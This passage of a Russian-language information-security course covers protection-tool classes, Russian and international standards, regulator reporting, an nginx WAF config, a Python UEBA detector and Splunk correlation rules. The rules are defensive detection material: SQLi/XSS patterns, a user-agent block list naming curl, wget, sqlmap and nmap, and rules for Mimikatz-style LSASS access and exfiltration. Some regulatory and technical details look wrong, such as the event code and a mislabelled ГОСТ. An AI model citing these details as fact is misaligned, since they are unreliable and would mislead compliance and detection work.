    B --> C[Идентификация рисков]
    C --> D[Анализ рисков]
    D --> E[Оценка рисков]
    E --> F[Обработка рисков]
    F --> G[Принятие рисков]
    G --> H[Мониторинг и обзор]
    H --> I[Коммуникация и консультации]
    I --> A
    
    style B fill:#3b82f6,color:#fff
    style F fill:#10b981,color:#fff
    style H fill:#f97316,color:#fff
```
## Список литературы
1. ГОСТ Р ИСО/МЭК 27001-2021 — Системы менеджмента информационной безопасности. Требования.
2. ГОСТ Р ИСО/МЭК 27005-2010 — Управление рисками информационной безопасности.
3. ФСТЭК России — Методические рекомендации по оценке рисков ИБ.
4. Герасименко В.А. — _Управление рисками информационной безопасности_. — М.: Юрайт.
5. Банников А.А. — _Аудит информационной безопасности_.
---
# Модуль 6. СРЕДСТВА ЗАЩИТЫ ИНФОРМАЦИИ

## 6.1. Классификация СЗИ (по ФСТЭК России)

| СЗИ               | Определение                           | Нормативный документ               | Основные функции                             | Класс защиты        |
| ----------------- | ------------------------------------- | ---------------------------------- | -------------------------------------------- | ------------------- |
| **КСЗИ**          | Криптографическое СЗИ                 | ГОСТ Р 34.10-2012, Приказ ФСБ №378 | Шифрование, ЭЦП, аутентификация              | 1-4 класс           |
| **Антивирус**     | ПО для обнаружения вредоносов         | ФСТЭК приказ №17, п. 6.2           | Сканирование, карантин, поведенческий анализ | Не классифицируется |
| **DLP**           | Предотвращение утечек данных          | 152-ФЗ, ФСТЭК приказ №21           | Контроль email, облака, USB, принтеры        | Не классифицируется |
| **IDS**           | Обнаружение вторжений                 | ФСТЭК приказ №17, п. 7.2           | Мониторинг, оповещение, корреляция           | Не классифицируется |
| **IPS**           | Предотвращение вторжений              | ФСТЭК приказ №17, п. 7.1           | Активная блокировка угроз                    | Не классифицируется |
| **SIEM**          | Управление событиями безопасности     | ФСТЭК приказ №17, п. 7.2           | Сбор, корреляция, отчётность, расследование  | Не классифицируется |
| **SOAR**          | Автоматизация реагирования            | ФСТЭК приказ №17, п. 8.1           | Orchestration, playbooks, автоматизация      | Не классифицируется |
| **Firewall (МЭ)** | Межсетевой экран                      | ФСТЭК приказ №17, п. 7.1           | Фильтрация трафика, правила доступа          | 1-5 класс           |
| **WAF**           | Защита веб-приложений                 | ФСТЭК приказ №17, п. 7.3           | Блокировка XSS, SQLi, DDoS                   | Не классифицируется |
| **UEBA**          | Анализ поведения пользователей        | ФСТЭК приказ №17, п. 7.2           | Обнаружение аномалий, инсайдерских угроз     | Не классифицируется |
| **SGRC**          | Управление ИБ, рисками, соответствием | ФСТЭК приказ №17, п. 1-3           | Политики, аудит, метрики, отчётность         | Не классифицируется |

## 6.2. Практическая реализация СЗИ

### 6.2.1. WAF в Nginx (ФСТЭК требование 7.3)

```nginx
#==============================================================================
# WAF КОНФИГУРАЦИЯ NGINX (ФСТЭК ТРЕБОВАНИЕ 7.3)
# Защита веб-приложений от OWASP Top-10
#==============================================================================

http {
    #==========================================================================
    # RATE LIMITING (Защита от DDoS)
    #==========================================================================
    limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
    limit_req_zone $server_name zone=api:10m rate=50r/s;
    
    #==========================================================================
    # РАЗМЕРЫ И ТАЙМАУТЫ
    #==========================================================================
    client_max_body_size 1M;
    client_body_buffer_size 128k;
    client_body_timeout 10;
    client_header_timeout 10;
    send_timeout 10;
    keepalive_timeout 65;
    
    server {
        listen 80;
        listen 443 ssl http2;
        server_name example.com;
        
        # SSL конфигурация (ФСТЭК требование 4.2)
        ssl_certificate /etc/nginx/ssl/example.com.crt;
        ssl_certificate_key /etc/nginx/ssl/example.com.key;
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
        ssl_prefer_server_ciphers on;
        ssl_session_cache shared:SSL:10m;
        
        #======================================================================
        # ЗАЩИТА ОТ SQL INJECTION (OWASP A03)
        #======================================================================
        set $block_sql_injections 0;
        if ($query_string ~* "union.*select") {
            set $block_sql_injections 1;
        }
        if ($query_string ~* "insert.*into") {
            set $block_sql_injections 1;
        }
        if ($query_string ~* "select.*from") {
            set $block_sql_injections 1;
        }
        if ($query_string ~* "delete.*from") {
            set $block_sql_injections 1;
        }
        if ($query_string ~* "update.*set") {
            set $block_sql_injections 1;
        }
        if ($query_string ~* "drop.*table") {
            set $block_sql_injections 1;
        }
        
        #======================================================================
        # ЗАЩИТА ОТ XSS (OWASP A03)
        #======================================================================
        set $block_xss 0;
        if ($query_string ~* "<script") {
            set $block_xss 1;
        }
        if ($query_string ~* "javascript:") {
            set $block_xss 1;
        }
        if ($query_string ~* "onerror=") {
            set $block_xss 1;
        }
        if ($query_string ~* "onload=") {
            set $block_xss 1;
        }
        
        #======================================================================
        # БЛОКИРОВКА ПОДОЗРИТЕЛЬНЫХ USER-AGENT
        #======================================================================
        if ($http_user_agent ~* (curl|wget|scanner|nikto|sqlmap|nmap|masscan)) {
            return 403;
        }
        if ($http_user_agent = "") {
            return 403;
        }
        
        location / {
            # Применение rate limiting
            limit_req zone=one burst=20 nodelay;
            limit_req_status 429;
            
            # Блокировка SQL injection и XSS
            if ($block_sql_injections = 1) {
                return 403;
            }
            if ($block_xss = 1) {
                return 403;
            }
            
            # Дополнительные заголовки безопасности
            add_header X-Frame-Options "SAMEORIGIN" always;
            add_header X-Content-Type-Options "nosniff" always;
            add_header X-XSS-Protection "1; mode=block" always;
            add_header Content-Security-Policy "default-src 'self'" always;
            add_header Referrer-Policy "strict-origin-when-cross-origin" always;
            
            # Скрытие версии nginx
            server_tokens off;
            
            proxy_pass http://backend;
        }
        
        #======================================================================
        # ЛОГИРОВАНИЕ (ФСТЭК ТРЕБОВАНИЕ 8.2)
        #======================================================================
        access_log /var/log/nginx/waf_access.log;
        error_log /var/log/nginx/waf_error.log;
    }
}
```

### 6.2.2. UEBA-детект (Python)

```python
#==============================================================================
# UEBA: ОБНАРУЖЕНИЕ АНОМАЛЬНОГО ПОВЕДЕНИЯ (ФСТЭК ТРЕБОВАНИЕ 7.2)
# User and Entity Behavior Analytics
#==============================================================================

import math
from collections import Counter, defaultdict
from datetime import datetime, timedelta
import json

class UEBADetector:
    """Система анализа поведения пользователей и сущностей"""
    
    def __init__(self):
        self.user_baselines = defaultdict(lambda: {
            'login_hours': [],
            'locations': [],
            'resources_accessed': [],
            'data_volume': []
        })
        self.alerts = []
    
    def calculate_entropy(self, string):
        """Вычисляет энтропию строки для обнаружения аномалий"""
        if not string:
            return 0
        prob = [float(string.count(c)) / len(string) for c in set(string)]
        return -sum(p * math.log2(p) for p in prob if p > 0)
    
    def detect_dga_domain(self, domain):
        """Обнаружение DGA-доменов (признак C2-коммуникации)"""
        parts = domain.split('.')
        if len(parts) > 2:
            main_domain = parts[0]
            entropy = self.calculate_entropy(main_domain)
            # DGA обычно имеют высокую энтропию и длину
            if entropy > 3.5 and len(main_domain) > 12:
                return True, entropy
        return False, 0
    
    def build_baseline(self, user_logs, days=30):
        """
        Построение базовой модели поведения пользователя
        user_logs: список логов активности за период
        """
        for log in user_logs:
            user = log['user']
            hour = datetime.fromisoformat(log['timestamp']).hour
            location = log.get('location', 'unknown')
            resource = log.get('resource', 'unknown')
            data_volume = log.get('data_volume', 0)
            
            self.user_baselines[user]['login_hours'].append(hour)
            self.user_baselines[user]['locations'].append(location)
            self.user_baselines[user]['resources_accessed'].append(resource)
            self.user_baselines[user]['data_volume'].append(data_volume)
    
    def detect_anomalies(self, current_activity):
        """
        Обнаружение аномалий в текущей активности
        Возвращает список алертов
        """
        alerts = []
        user = current_activity['user']
        
        if user not in self.user_baselines:
            return alerts  # Нет базовой модели
        
        baseline = self.user_baselines[user]
        
        # 1. Аномальное время входа
        current_hour = datetime.fromisoformat(current_activity['timestamp']).hour
        if baseline['login_hours']:
            avg_hour = sum(baseline['login_hours']) / len(baseline['login_hours'])
            if abs(current_hour - avg_hour) > 6:  # Отклонение > 6 часов
                alerts.append({
                    'type': 'ANOMALOUS_LOGIN_TIME',
                    'severity': 'MEDIUM',
                    'user': user,
                    'current_hour': current_hour,
                    'average_hour': round(avg_hour, 1),
                    'фстэк_требование': '7.2'
                })
        
        # 2. Аномальная локация
        current_location = current_activity.get('location', 'unknown')
        if baseline['locations'] and current_location not in baseline['locations'][-10:]:
            alerts.append({
                'type': 'ANOMALOUS_LOCATION',
                'severity': 'HIGH',
                'user': user,
                'current_location': current_location,
                'known_locations': list(set(baseline['locations']))[:5],
                'фстэк_требование': '7.2'
            })
        
        # 3. Аномальный объём данных
        current_volume = current_activity.get('data_volume', 0)
        if baseline['data_volume']:
            avg_volume = sum(baseline['data_volume']) / len(baseline['data_volume'])
            if current_volume > avg_volume * 5:  # В 5 раз больше среднего
                alerts.append({
                    'type': 'EXCESSIVE_DATA_ACCESS',
                    'severity': 'HIGH',
                    'user': user,
                    'current_volume': current_volume,
                    'average_volume': round(avg_volume, 2),
                    'фстэк_требование': '7.2'
                })
        
        # 4. Подозрительные домены (DGA)
        if 'domain' in current_activity:
            is_dga, entropy = self.detect_dga_domain(current_activity['domain'])
            if is_dga:
                alerts.append({
                    'type': 'DGA_DOMAIN_DETECTED',
                    'severity': 'CRITICAL',
                    'user': user,
                    'domain': current_activity['domain'],
                    'entropy': round(entropy, 2),
                    'фстэк_требование': '7.1'
                })
        
        return alerts
    
    def generate_report(self, alerts):
        """Генерация отчёта UEBA"""
        report = {
            'timestamp': datetime.now().isoformat(),
            'total_alerts': len(alerts),
            'critical': len([a for a in alerts if a.get('severity') == 'CRITICAL']),
            'high': len([a for a in alerts if a.get('severity') == 'HIGH']),
            'medium': len([a for a in alerts if a.get('severity') == 'MEDIUM']),
            'alerts': alerts
        }
        return report

# =============================================================================
# ПРИМЕР ИСПОЛЬЗОВАНИЯ
# =============================================================================

if __name__ == "__main__":
    ueba = UEBADetector()
    
    # Построение базовой модели (30 дней истории)
    historical_logs = [
        {'user': 'jsmith', 'timestamp': '2024-01-01T09:00:00', 'location': 'Moscow', 
         'resource': 'file-server', 'data_volume': 100},
        {'user': 'jsmith', 'timestamp': '2024-01-02T09:30:00', 'location': 'Moscow',
         'resource': 'file-server', 'data_volume': 150},
        {'user': 'jsmith', 'timestamp': '2024-01-03T08:45:00', 'location': 'Moscow',
         'resource': 'database', 'data_volume': 200},
    ] * 10  # Умножаем для симуляции 30 дней
    
    ueba.build_baseline(historical_logs)
    print("✅ Базовая модель поведения построена")
    
    # Текущая подозрительная активность
    suspicious_activity = {
        'user': 'jsmith',
        'timestamp': '2024-02-01T03:00:00',  # 3 часа ночи (аномалия)
        'location': 'Beijing',  # Неизвестная локация
        'resource': 'database',
        'data_volume': 5000,  # В 25 раз больше среднего
        'domain': 'x7k2m9p4q1r8.malware.com'  # DGA-домен
    }
    
    print("\n=== АНАЛИЗ ТЕКУЩЕЙ АКТИВНОСТИ ===")
    alerts = ueba.detect_anomalies(suspicious_activity)
    
    if alerts:
        print(f"🚨 ОБНАРУЖЕНО {len(alerts)} АНОМАЛИЙ:\n")
        for alert in alerts:
            print(f"  [{alert['severity']}] {alert['type']}")
            print(f"    Пользователь: {alert['user']}")
            if 'current_location' in alert:
                print(f"    Локация: {alert['current_location']}")
            if 'current_volume' in alert:
                print(f"    Объём данных: {alert['current_volume']} (среднее: {alert['average_volume']})")
            if 'domain' in alert:
                print(f"    Домен: {alert['domain']} (энтропия: {alert['entropy']})")
            print(f"    ФСТЭК требование: {alert.get('фстэк_требование', 'N/A')}")
            print()
        
        # Генерация отчёта
        report = ueba.generate_report(alerts)
        print(f"=== ОТЧЁТ UEBA ===")
        print(f"Критических: {report['critical']}")
        print(f"Высоких: {report['high']}")
        print(f"Средних: {report['medium']}")
    else:
        print("✅ Аномалий не обнаружено")
```

### 6.2.3. SIEM корреляционные правила (Splunk)

```spl
#==============================================================================
# SIEM КОРРЕЛЯЦИОННЫЕ ПРАВИЛА (ФСТЭК ТРЕБОВАНИЕ 7.2)
# Примеры для Splunk
#==============================================================================

# -----------------------------------------------------------------------------
# Правило 1: Множественные неудачные логины (Brute Force)
# -----------------------------------------------------------------------------
index=windows EventCode=4625 
| stats count by user, src_ip, _time 
| where count > 10 
| eval time_window=_time/300 
| stats sum(count) as total_failures by user, src_ip, time_window 
| where total_failures > 50 
| alert

# -----------------------------------------------------------------------------
# Правило 2: PowerShell из Office приложений (Фишинг)
# -----------------------------------------------------------------------------
index=windows EventCode=4688 
| search ParentImage="*WINWORD.EXE*" OR ParentImage="*EXCEL.EXE*" 
| search Image="*powershell.exe*" OR Image="*cmd.exe*" 
| table _time, user, host, ParentImage, Image, CommandLine 
| alert

# -----------------------------------------------------------------------------
# Правило 3: Доступ к LSASS (Mimikatz)
# -----------------------------------------------------------------------------
index=windows EventCode=4680 
| search TargetImage="*lsass.exe*" 
| search AccessMask="0x1FFFFF" OR AccessMask="0x1010" 
| table _time, user, host, SourceImage, TargetImage 
| alert

# -----------------------------------------------------------------------------
# Правило 4: Латеральное перемещение (WinRM)
# -----------------------------------------------------------------------------
index=windows EventCode=16 
| search ConnectionStatus="Connected" 
| stats dc(dest_ip) as unique_destinations by src_ip, user 
| where unique_destinations > 10 
| table src_ip, user, unique_destinations 
| alert

# -----------------------------------------------------------------------------
# Правило 5: Экфильтрация данных (большой объём)
# -----------------------------------------------------------------------------
index=proxy 
| stats sum(bytes_out) as total_bytes by user, dest_domain 
| where total_bytes > 100000000 
| table user, dest_domain, total_bytes 
| alert
```
## Список литературы
1. НКЦКИ — Методические рекомендации по реагированию на компьютерные инциденты.
2. ФСТЭК России — Требования к обнаружению, предупреждению и ликвидации последствий компьютерных атак.
3. ГОСТ Р 56939-2016 — Защита информации. Обнаружение вторжений.
4. Касперский Лаб — Руководство по реагированию на инциденты ИБ.
5. Positive Technologies — Практические рекомендации по расследованию инцидентов ИБ.
---
# Модуль 7. СТАНДАРТЫ И РЕГУЛИРОВАНИЕ В ИБ

## 7.1. Международные стандарты

| Стандарт | Область | Ключевые элементы | Применение в РФ | Сертификация |
|----------|---------|-------------------|-----------------|--------------|
| **ISO/IEC 27001** | СМИБ (Система менеджмента ИБ) | Системный подход, PDCA, оценка рисков | ГОСТ Р ИСО/МЭК 27001-2021 | Да (международная) |
| **ISO/IEC 27002** | Контрольные меры | 114 контролей, рекомендации по внедрению | Рекомендации | Нет |
| **ISO/IEC 27005** | Управление рисками ИБ | Оценка, обработка, мониторинг рисков | ГОСТ Р ИСО/МЭК 27005-2021 | Нет |
| **ISO/IEC 27017** | Облачная безопасность | Дополнительные контроли для облаков | Рекомендации | Да |
| **ISO/IEC 27018** | Защита ПДн в облаке | Конфиденциальность в облачных сервисах | Рекомендации | Да |
| **NIST CSF** | Кибербезопасность | Identify, Protect, Detect, Respond, Recover | Рекомендации | Нет |
| **NIST SP 800-53** | Контроли безопасности | 1000+ контролей для федеральных систем | Рекомендации | Нет |

## 7.2. Российские стандарты и законы

### 7.2.1. Федеральные законы

| Документ   | Суть                             | Требования                               | Штрафы      | Регулятор    |
| ---------- | -------------------------------- | ---------------------------------------- | ----------- | ------------ |
| **152-ФЗ** | Персональные данные              | Шифрование, аудит, согласие, локализация | До 10 млн ₽ | Роскомнадзор |
| **149-ФЗ** | Защита информации                | Классификация, СЗИ, обучение             | До 5 млн ₽  | ФСТЭК, ФСБ   |
| **187-ФЗ** | КИИ (критическая инфраструктура) | Категорирование, аттестация, ФСТЭК       | До 50 млн ₽ | ФСТЭК        |
| **98-ФЗ**  | Коммерческая тайна               | Режим КТ, грифы, учёт носителей          | До 5 млн ₽  | ФАС          |
| **63-ФЗ**  | Электронная подпись              | Квалифицированная/неквалифицированная ЭП | —           | Минцифры     |

### 7.2.2. ГОСТы и требования ФСТЭК

| Документ | Область | Требования | Обязательно для |
|----------|---------|------------|-----------------|
| **ГОСТ Р ИСО/МЭК 27001-2021** | СМИБ | Системный подход к ИБ | Госорганы, рекомендовано всем |
| **ГОСТ Р 34.10-2012** | Криптография | Алгоритмы цифровой подписи | Все использующие ЭП |
| **ГОСТ Р 34.11-2012** | Хеширование | Функция «Стрибог» | Все системы хеширования |
| **ГОСТ Р 34.12-2015** | Шифрование | «Кузнечик» (128 бит) | Все системы шифрования |
| **Приказ ФСТЭК №17** | СЗИ для ГИС | Требования к СЗИ для госинфосистем | ГИС (1, 2, 3 класс) |
| **Приказ ФСТЭК №21** | ПДн | Требования к защите ПДн | Операторы ПДн |
| **Приказ ФСТЭК №31** | КИИ | Требования к КИИ | Субъекты КИИ |
| **Приказ ФСБ №378** | КСЗИ | Использование криптографических средств | Все использующие шифрование |

### 7.2.3. Уровни защиты ПДн (152-ФЗ + ФСТЭК №21)

| Уровень | Тип данных | Тип системы | Требования |
|---------|------------|-------------|------------|
| **УЗ-1** | Специальные, биометрические | Автоматизированные | Максимальные (шифрование, СКЗИ, ФСТЭК 4 класс) |
| **УЗ-2** | Специальные | Автоматизированные | Высокие (шифрование, антивирус, ФСТЭК 3 класс) |
| **УЗ-3** | Иные ПДн | Автоматизированные | Средние (антивирус, контроль доступа) |
| **УЗ-4** | Иные ПДн | Неавтоматизированные | Минимальные (учёт носителей) |

## 7.3. Сравнение стандартов

| Критерий | ISO 27001 | ГОСТ 27001-2021 | 152-ФЗ | ФСТЭК №17/21 |
|----------|-----------|-----------------|--------|--------------|
| **Применение** | Международное | РФ (госсектор) | Обработка ПДн | ГИС, ПДн, КИИ |
| **Особенность** | Глобальное признание | Учёт 152-ФЗ, 149-ФЗ | Жёсткие требования к ПДн | Технические требования к СЗИ |
| **Сертификация** | Да (международная) | Да (российская) | Регистрация в Роскомнадзоре | Аттестация системы |
| **Срок действия** | 3 года | 3 года | Бессрочно (до изменений) | 3 года (аттестат) |
| **Стоимость** | $15,000-50,000 | $10,000-30,000 | $5,000-15,000 | $20,000-100,000 |

## 7.4. Процесс внедрения ISO 27001 (по ФСТЭК)

```mermaid
graph LR
    A[Анализ текущего состояния] --> B[Разработка политики ИБ]
    B --> C[Оценка рисков ISO 27005]
    C --> D[Выбор мер защиты ISO 27002]
    D --> E[Внедрение СЗИ]
    E --> F[Обучение персонала]
    F --> G[Внутренний аудит]
    G --> H[Сертификация]
    
    style A fill:#3b82f6,color:#fff
    style B fill:#3b82f6,color:#fff
    style C fill:#f97316,color:#fff
    style D fill:#10b981,color:#fff
    style E fill:#10b981,color:#fff
    style F fill:#8b5cf6,color:#fff
    style G fill:#ef4444,color:#fff
    style H fill:#10b981,color:#fff
```

**Детальный план внедрения (12-18 месяцев):**

| Этап | Длительность | Задачи | Результат |
|------|--------------|--------|-----------|
| **1. Подготовка** | 1-2 мес. | Создание команды, обучение, анализ текущего состояния | Отчёт о текущем состоянии |
| **2. Политика ИБ** | 1-2 мес. | Разработка политик, процедур, инструкций | Комплект документов СМИБ |
| **3. Оценка рисков** | 2-3 мес. | Идентификация активов, оценка рисков по ISO 27005 | Реестр рисков, план обработки |
| **4. Внедрение мер** | 4-6 мес. | Внедрение СЗИ, настройка процессов | Рабочая система защиты |
| **5. Обучение** | 1-2 мес. | Обучение персонала, тестирование | Протоколы обучения |
| **6. Внутренний аудит** | 1-2 мес. | Проверка соответствия, корректировки | Отчёт внутреннего аудита |
| **7. Сертификация** | 2-3 мес. | Внешний аудит, получение сертификата | Сертификат ISO 27001 |

## 7.5. Отчётность в регуляторы (ФСТЭК, Роскомнадзор)

| Регулятор | Форма отчётности | Срок | Нормативный документ | Штраф за нарушение |
|-----------|------------------|------|---------------------|-------------------|
| **ФСТЭК** | Форма 7-И (инциденты) | 24 часа | Приказ ФСТЭК №17 | До 500,000 ₽ |
| **ФСТЭК** | Уведомление о категорировании КИИ | 30 дней | 187-ФЗ | До 50 млн ₽ |
| **Роскомнадзор** | Уведомление об обработке ПДн | До начала обработки | 152-ФЗ ст. 22 | До 500,000 ₽ |
| **Роскомнадзор** | Отчёт о нарушениях ПДн | 24 часа | 152-ФЗ ст. 19 | До 10 млн ₽ |
| **ФСБ** | Уведомление об использовании КСЗИ | До начала использования | Приказ ФСБ №378 | До 300,000 ₽ |
| **ФСТЭК** | Аттестат соответствия ГИС | Каждые 3 года | Приказ ФСТЭК №17 | Приостановка эксплуатации |

### 7.5.1. Форма 7-И (ФСТЭК) — пример заполнения

```markdown
# ФОРМА 7-И: ОТЧЁТ ОБ ИНЦИДЕНТЕ ИБ
# (ФСТЭК России Приказ №17)

================================================================================
ОБЩАЯ ИНФОРМАЦИЯ
================================================================================
Номер инцидента: INC-2024-0423
Дата регистрации: 15.01.2024 14:32:17 UTC
Категория по ФСТЭК: 2 (Значительный инцидент)
Приоритет: HIGH
Статус: Closed
Владелец: SOC Team Lead

================================================================================
ДЕТЕКТ
================================================================================
Источник обнаружения: SIEM (Splunk)
Правило корреляции: "PowerShell Encoded Command Execution"
Уровень доверия: 85%

================================================================================
IMPACT (ВОЗДЕЙСТВИЕ)
================================================================================
Систем скомпрометировано: 1
Данных эксфильтровано: Нет
Учётных записей скомпрометировано: 1
Финансовый ущерб: 0 руб. (предотвращён)

================================================================================
ОТЧЁТНОСТЬ (ФСТЭК)
================================================================================
Отчёт в ФСТЭК: Требуется (Категория 2)
Срок: 24 часа с момента обнаружения
Статус: Отправлен 16.01.2024 10:00:00
Номер уведомления: ФСТЭК-2024-0423

================================================================================
ПОДПИСИ
================================================================================
SOC Manager: _________________ / И.И. Иванов / 16.01.2024
CISO: _________________ / П.П. Петров / 16.01.2024
Ответственный за ФСТЭК: _________________ / С.С. Сидоров / 16.01.2024
================================================================================
```
## Список литературы 
1. Федеральный закон №149-ФЗ — _Об информации, информационных технологиях и защите информации_.
2. Федеральный закон №152-ФЗ — _О персональных данных_.
3. Федеральный закон №187-ФЗ — _О безопасности критической информационной инфраструктуры РФ_.
4. Приказ ФСТЭК России №17 — Требования по защите ПДн.
5. Приказ ФСТЭК России №239 — Требования по защите КИИ.